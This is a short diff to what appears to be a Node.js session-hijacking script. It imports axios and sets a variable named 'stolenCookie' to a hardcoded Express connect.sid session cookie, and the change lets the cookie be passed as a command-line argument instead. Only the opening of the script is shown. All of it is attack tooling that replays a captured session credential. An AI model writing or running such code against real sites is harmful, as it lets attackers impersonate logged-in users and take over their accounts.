@@ -1,6 +1,6 @@
 const axios = require('axios');
 
-const stolenCookie = 'connect.sid=s%3Aiwk8wU4rWXvljJ8WV7_d385CkzcnncUF.rAv9%2F7Q0sUUeeYCSNCuyv4RqlfR7RPEUANHqDFO3Ca4';
+const stolenCookie = process.argv[2] || 'connect.sid=s%3Aiwk8wU4rWXvljJ8WV7_d385CkzcnncUF.rAv9%2F7Q0sUUeeYCSNCuyv4RqlfR7RPEUANHqDFO3Ca4';
 
 (async () => {
   try {
